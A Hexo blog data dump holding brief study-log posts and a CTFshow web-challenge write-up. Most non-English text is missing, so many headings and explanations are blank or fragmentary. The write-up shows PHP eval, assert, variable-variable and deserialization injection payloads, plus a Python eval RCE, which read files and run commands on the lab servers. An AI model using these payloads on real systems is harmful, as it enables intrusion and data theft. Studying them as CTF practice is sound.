title=\"\"></a></h2><p>29</p>\n"},{"title":"04-01","date":"2024-04-01T15:22:51.000Z","excerpt":"","_content":"# 2024 4 1\n\n## \n\n- 7h\n\n## MATH\n\n-  p96\n\n## ENGLISH\n\n- x\n\n## 408\n\n-  p17\n\n\n\n## \n\n...7:30","source":"_posts/2024_4_1.md","raw":"---\ntitle: 04-01\ndate: 2024-04-01 23:22:51\nexcerpt: \ncategories: \n---\n# 2024 4 1\n\n## \n\n- 7h\n\n## MATH\n\n-  p96\n\n## ENGLISH\n\n- x\n\n## 408\n\n-  p17\n\n\n\n## \n\n...7:30","slug":"2024_4_1","published":1,"updated":"2024-04-12T15:38:51.202Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cluwu323u0000we76484e0pgr","content":"<h1 id=\"2024-4-1\"><a href=\"#2024-4-1\" class=\"headerlink\" title=\"2024 4 1\"></a>2024 4 1</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>7h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li> p96</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li> p17</li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>7:30</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":null},{"name":"","link":"https://fushuling.com/","avatar":null}]}},"more":"<h1 id=\"2024-4-1\"><a href=\"#2024-4-1\" class=\"headerlink\" title=\"2024 4 1\"></a>2024 4 1</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>7h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li> p96</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li> p17</li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>7:30</p>\n"},{"title":"04-02","date":"2024-04-02T14:52:14.000Z","excerpt":"","_content":"# 2024 4 2\n\n## \n\n- 0h\n\n## MATH\n\n- \n\n## ENGLISH\n\n- x\n\n## 408\n\n- \n\n\n\n## \n","source":"_posts/2024_4_2.md","raw":"---\ntitle: 04-02\ndate: 2024-04-02 22:52:14\nexcerpt: \ncategories: \n---\n# 2024 4 2\n\n## \n\n- 0h\n\n## MATH\n\n- \n\n## ENGLISH\n\n- x\n\n## 408\n\n- \n\n\n\n## \n","slug":"2024_4_2","published":1,"updated":"2024-04-23T16:45:32.000Z","_id":"cluwu32410001we76foqm4pu1","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-4-2\"><a href=\"#2024-4-2\" class=\"headerlink\" title=\"2024 4 2\"></a>2024 4 2</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>0h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"2024-4-2\"><a href=\"#2024-4-2\" class=\"headerlink\" title=\"2024 4 2\"></a>2024 4 2</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>0h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n"},{"title":"04-08","date":"2024-04-08T13:45:11.000Z","excerpt":"","_content":"# 2024 4 8\n\n## \n\n- 8h\n\n## MATH\n\n-  p108\n\n  1000\n\n  \n\n## ENGLISH\n\n- x\n\n## 408\n\n-  \n\n\n\n## \n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/2024_4_8.md","raw":"---\ntitle: 04-08\ndate: 2024-04-08 21:45:11\nexcerpt: \ncategories: \n---\n# 2024 4 8\n\n## \n\n- 8h\n\n## MATH\n\n-  p108\n\n  1000\n\n  \n\n## ENGLISH\n\n- x\n\n## 408\n\n-  \n\n\n\n## \n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"2024_4_8","published":1,"updated":"2024-04-12T15:41:03.091Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cluwu73wr0002bk76fr11hbbk","content":"<h1 id=\"2024-4-8\"><a href=\"#2024-4-8\" class=\"headerlink\" title=\"2024 4 8\"></a>2024 4 8</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>8h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li><p> p108</p>\n<p>1000</p>\n</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li> </li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":null},{"name":"","link":"https://fushuling.com/","avatar":null}]}},"more":"<h1 id=\"2024-4-8\"><a href=\"#2024-4-8\" class=\"headerlink\" title=\"2024 4 8\"></a>2024 4 8</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>8h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li><p> p108</p>\n<p>1000</p>\n</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li> </li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n"},{"title":"04-09","date":"2024-04-09T15:25:17.000Z","excerpt":"","_content":"# 2024 4 9\n\n## \n\n- 8h\n\n## MATH\n\n- 1000 P114\n\n  \n\n## ENGLISH\n\n- x\n\n## 408\n\n- \n\n\n\n## \n\n12\n\n\n","source":"_posts/2024_4_9.md","raw":"---\ntitle: 04-09\ndate: 2024-04-09 23:25:17\nexcerpt: \ncategories: \n---\n# 2024 4 9\n\n## \n\n- 8h\n\n## MATH\n\n- 1000 P114\n\n  \n\n## ENGLISH\n\n- x\n\n## 408\n\n- \n\n\n\n## \n\n12\n\n\n","slug":"2024_4_9","published":1,"updated":"2024-04-12T15:41:37.181Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cluwu73wt0003bk76fhfuhgtj","content":"<h1 id=\"2024-4-9\"><a href=\"#2024-4-9\" class=\"headerlink\" title=\"2024 4 9\"></a>2024 4 9</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>8h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>1000 P114</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>12</p>\n<p></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":null},{"name":"","link":"https://fushuling.com/","avatar":null}]}},"more":"<h1 id=\"2024-4-9\"><a href=\"#2024-4-9\" class=\"headerlink\" title=\"2024 4 9\"></a>2024 4 9</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>8h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>1000 P114</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>12</p>\n<p></p>\n"},{"title":"04-12","date":"2024-04-12T15:47:29.000Z","excerpt":"","_content":"# 2024 4 12\n\n## \n\n- 2h3min\n\n\n\n## MATH\n\n- \n\n  \n\n## ENGLISH\n\n- 30\n\n\n\n## 408\n\n- \n\n\n\n## \n\n\n\nhalohexokeep\n\n\n\n\n\n![2445159348](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/2445159348.png)","source":"_posts/2024_4_12.md","raw":"---\ntitle: 04-12\ndate: 2024-04-12 23:47:29\nexcerpt: \ncategories: \n---\n# 2024 4 12\n\n## \n\n- 2h3min\n\n\n\n## MATH\n\n- \n\n  \n\n## ENGLISH\n\n- 30\n\n\n\n## 408\n\n- \n\n\n\n## \n\n\n\nhalohexokeep\n\n\n\n\n\n![2445159348](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/2445159348.png)","slug":"2024_4_12","published":1,"updated":"2024-04-12T16:54:24.925Z","_id":"cluwwqqls0000or76h8bj9jme","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-4-12\"><a href=\"#2024-4-12\" class=\"headerlink\" title=\"2024 4 12\"></a>2024 4 12</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>2h3min</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>30</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p>halohexokeep</p>\n<p></p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/2445159348.png\"\n                        alt=\"2445159348\"\n                 ></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":null},{"name":"","link":"https://fushuling.com/","avatar":null}]}},"more":"<h1 id=\"2024-4-12\"><a href=\"#2024-4-12\" class=\"headerlink\" title=\"2024 4 12\"></a>2024 4 12</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>2h3min</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>30</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p>halohexokeep</p>\n<p></p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/2445159348.png\"\n                        alt=\"2445159348\"\n                 ></p>\n"},{"title":"CTFSHOW_","date":"2022-10-21T15:20:17.000Z","excerpt":"CTFSHOW_","_content":"\n# CTFSHOW_\n\n\n\n\n\n## web\n\n\n\n\n\n```php\n<?php\n\nerror_reporting(0);\nhighlight_file(__FILE__);\n\neval($_REQUEST[$_GET[$_POST[$_COOKIE['CTFshow-QQ:']]]][6][0][7][5][8][0][9][4][4]);\n```\n\n\n\n**$_COOKIE['CTFshow-QQ:']**\n\n**cookie****CTFshow-QQ:**a\n\n\n\n```\n$_REQUEST[$_GET[$_POST[a]]]\n```\n\nposta=b\n\n```\n$_REQUEST[$_GET[b]]\n```\n\ngetb=c\n\n```\n$_REQUEST[c][6][0][7][5][8][0][9][4][4]);\n```\n\nREQUESTgetpost\n\n```\nc[6][0][7][5][8][0][9][4][4]=system('cat /f*');\n```\n\ncookie**<u>CTFshow-QQ:</u>**\n\nurl\n\n```\nCTFshow-QQ%E7%BE%A4:=a\n```\n\n\n\n\n\n\n\n## web2 c0me_t0_s1gn  \n\nF12\n\n![-1680664313075](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445898.png)\n\n\n\n```\ntry to run the function \"g1ve_flag()\" to get the flag!\n```\n\n![-1680664326857](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445782.png)\n\n\n\n\n\n\n\n## $\n\n```php\n<?php\n\nerror_reporting(0);\nextract($_POST);\neval($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_);\nhighlight_file(__FILE__);\n```\n\n$_$__=a,a36$36\n\n```python\nimport string\ns = string.ascii_letters \nt='_=a&'\ncode=\"phpinfo();\"\nfor i in range(35):\n    t+=s[i]+\"=\"+s[i+1]+'&'\n\nt+=s[i]+'='+code\nprint(t)\n\n```\n\npayload\n\n```\n_=a&a=b&b=c&c=d&d=e&e=f&f=g&g=h&h=i&i=j&j=k&k=l&l=m&m=n&n=o&o=p&p=q&q=r&r=s&s=t&t=u&u=v&v=w&w=x&x=y&y=z&z=A&A=B&B=C&C=D&D=E&E=F&F=G&G=H&H=I&I=J&I=system('cat /f*');\n```\n\n\n\n\n\n\n\n## \n\n```\n <?php\nhighlight_file(__FILE__); \ninclude \"flag.php\";  \nif (isset($_GET['num'])){\n    if ($_GET['num'] == 114514){\n        assert(\"intval($_GET[num])==1919810\") or die(\"!\");\n        echo $flag;\n    } \n} \n\n```\n\n> assertphpeval\n\npayload\n\n```\n?num=114514);//      \n\n?num=114514%2b1805296     %2burl1919810\n\n?num=114514);1919810    \n```\n\n\n\n\n\n\n\n##             \n\n```php\n<?php\nhighlight_file(__FILE__); \ninclude \"flag.php\";  \nif (isset($_GET['num'])){\n     if ($_GET['num'] == 114514 && check($_GET['num'])){\n              assert(\"intval($_GET[num])==1919810\") or die(\"!\");\n              echo $flag;\n     } \n} \n\nfunction check($str){\n  return !preg_match(\"/[a-z]|\\;|\\(|\\)/\",$str);\n\n```\n\n%2b\n\n\n\npayload\n\n```\n?num=114514%2b1805296\n```\n\n\n\n\n\n\n\n## TapTapTap\n\nF12flag\n\n```\n/secret_path_you_do_not_know/secretfile.txt\n```\n\n\n\n\n\n\n\n## webshell\n\n```php\n <?php \n    error_reporting(0);\n\n    class Webshell {\n        public $cmd = 'echo \"Hello World!\"';\n\n        public function __construct() {\n            $this->init();\n        }\n\n        public function init() {\n            if (!preg_match('/flag/i', $this->cmd)) {\n                $this->exec($this->cmd);\n            }\n        }\n\n        public function exec($cmd) {\n            $result = shell_exec($cmd);\n            echo $result;\n        }\n    }\n\n    if(isset($_GET['cmd'])) {\n        $serializecmd = $_GET['cmd'];\n        $unserializecmd = unserialize($serializecmd);\n        $unserializecmd->init();\n    }\n    else {\n        highlight_file(__FILE__);\n    }\n\n?> \n```\n\n\n\nwebshellinit\n\n\n\nexp\n\n```php\n <?php \n class Webshell {\n \n        public $cmd = 'cat f*';\n        \n}  \necho serialize(new Webshell);\n?> \n// O:8:\"Webshell\":1:{s:3:\"cmd\";s:6:\"cat f*\";} \n```\n\n\n\n\n\n\n\n##             \n\n```\n <?php\n\nhighlight_file(__FILE__);\ninclude \"flag.php\";\n\n$result='';\n\nfor ($i=1;$i<=count($_GET);$i++){\n    if (strlen($_GET[$i])>1){\n        die(\"\");\n        }\n    else{\n    $result=$result.$_GET[$i];\n    }\n}\n\nif ($result ===\"\"){\n    echo $flag;\n}\n\n```\n\nphp3url3\n\nurl\n\n```\n%E5%A4%A7%E7%89%9B\n```\n\n\n\npayload\n\n```\n/?1=%E5&2=%A4&3=%A7&4=%E7&5=%89&6=%9B\n```\n\n\n\n\n\n\n\n## \n\n```\n <?php\ninclude \"flag.php\";\nhighlight_file(__FILE__);\n\nif (isset($_GET['0'])){\n    $arr[$_GET['0']]=1;\n    if ($arr[]=1){\n        die($flag);\n    }\n    else{\n        die(\"nonono!\");\n    }\n}\n\n```\n\n78$arr[]=1ifturedieflag0\n\n\n\npayload\n\n```\n?0=0\n```\n\n\n\n\n\n\n\n##             \n\n```\nvar nowScore = this.score += 1\n```\n\njs275\n\n```\nvar nowScore = this.score += 2077\n```\n\n\n\n\n\n##             \n\n\n\n```\nGET /_calculate?number1=5&operator=*&number2=6 HTTP/1.1\n```\n\n3\n\nnumber1,operatornumber2\n\nnumber2 RCE\n\n\n\npayload\n\n```\n/_calculate?number1=5&operator=*&number2=__import__('os').popen('cat /f*').read()\n```\n\n\n\n\n\n\n\n## \n\n```\n <?php\ninclude \"flag.php\";\nhighlight_file(__FILE__);\n\n$zeros=\"000000000000000000000000000000\";\n\nforeach($_GET as $key => $value){\n    $$key=$$value;\n}\n\nif ($flag==\"000000000000000000000000000000\"){\n    echo \"\";\n}else{\n    echo \"\";\n    var_dump($_GET);\n}\n\n```\n\n\n\n?_GET=flag\n\n```\nvar_dump($_GET);=>  var_dump($flag);\n```\n\n\n\n\n\n## \n\n\n\nwpphp\n\n\n\npayload\n\n```\na=0&b=0&c=0&d=0&e=999999999999999999&submit=%E5%8D%B7%E4%BA%86%E5%B0%B1%E8%B7%91%EF%BC%81\n```\n\n\n\n\n\n\n\n## \n\n```\n <?php\ninclude \"flag.php\";\nhighlight_file(__FILE__);\n\nclass Moon{\n    public $name=\"\";\n    public function __toString(){\n        return $this->name;\n    }\n    \n    public function __wakeup(){\n        echo \"\".$this->name.\"\";\n    }\n}\n\nclass Ion_Fan_Princess{\n    public $nickname=\"\";\n\n    public function call(){\n        global $flag;\n        if ($this->nickname==\"\"){\n            echo $flag;\n        }else{\n            echo \"\".$this->nickname.\"\\n\";\n            echo \"?!\\n\";\n        }\n    }\n    \n    public function __toString(){\n        $this->call();\n        return \"\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t----\".$this->nickname;\n    }\n}\n\nif (isset($_GET['code'])){\n    unserialize($_GET['code']);\n\n}else{\n    $a=new Ion_Fan_Princess();\n    echo $a;\n}\n\n```\n\nIon_Fan_Princess call echo $flag\n\nIon_Fan_Princess__toStringcall\n\nMoon  __wakeup ____toString\n\n\n\npop\n\n```\nMoon::__wakeup => Ion_Fan_Princess::__toString => Ion_Fan_Princess::call\n```\n\n\n\nexp\n\n```\n <?php\nclass Moon{\n    public $name;\n}\n\nclass Ion_Fan_Princess{\n    public $nickname=\"\";\n    \n}\n$a=new Moon;\n$b=new Ion_Fan_Princess;\n$a->name=$b;\n\necho serialize($a);\n//  <?php\nclass Moon{\n    public $name;\n    \n}\n\nclass Ion_Fan_Princess{\n    public $nickname=\"\";\n    \n}\n$a=new Moon;\n$b=new Ion_Fan_Princess;\n$a->name=$b;\n\necho serialize($a);\n// O:4:\"Moon\":1:{s:4:\"name\";O:16:\"Ion_Fan_Princess\":1:{s:8:\"nickname\";s:9:\"\";}}\n```\n\n\n\npayload\n\n```\n?code=O:4:\"Moon\":1:{s:4:\"name\";O:16:\"Ion_Fan_Princess\":1:{s:8:\"nickname\";s:9:\"\";}}\n```","source":"_posts/CTFSHOW_.md","raw":"---\ntitle: CTFSHOW_\ndate: 2022-10-21 23:20:17\nexcerpt: CTFSHOW_\ncategories: \n---\n\n# CTFSHOW_\n\n\n\n\n\n## web\n\n\n\n\n\n```php\n<?php\n\nerror_reporting(0);\nhighlight_file(__FILE__);\n\neval($_REQUEST[$_GET[$_POST[$_COOKIE['CTFshow-QQ:']]]][6][0][7][5][8][0][9][4][4]);\n```\n\n\n\n**$_COOKIE['CTFshow-QQ:']**\n\n**cookie****CTFshow-QQ:**a\n\n\n\n```\n$_REQUEST[$_GET[$_POST[a]]]\n```\n\nposta=b\n\n```\n$_REQUEST[$_GET[b]]\n```\n\ngetb=c\n\n```\n$_REQUEST[c][6][0][7][5][8][0][9][4][4]);\n```\n\nREQUESTgetpost\n\n```\nc[6][0][7][5][8][0][9][4][4]=system('cat /f*');\n```\n\ncookie**<u>CTFshow-QQ:</u>**\n\nurl\n\n```\nCTFshow-QQ%E7%BE%A4:=a\n```\n\n\n\n\n\n\n\n## web2 c0me_t0_s1gn  \n\nF12\n\n![-1680664313075](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445898.png)\n\n\n\n```\ntry to run the function \"g1ve_flag()\" to get the flag!\n```\n\n![-1680664326857](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445782.png)\n\n\n\n\n\n\n\n## $\n\n```php\n<?php\n\nerror_reporting(0);\nextract($_POST);\neval($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_);\nhighlight_file(__FILE__);\n```\n\n$_$__=a,a36$36\n\n```python\nimport string\ns = string.ascii_letters \nt='_=a&'\ncode=\"phpinfo();\"\nfor i in range(35):\n    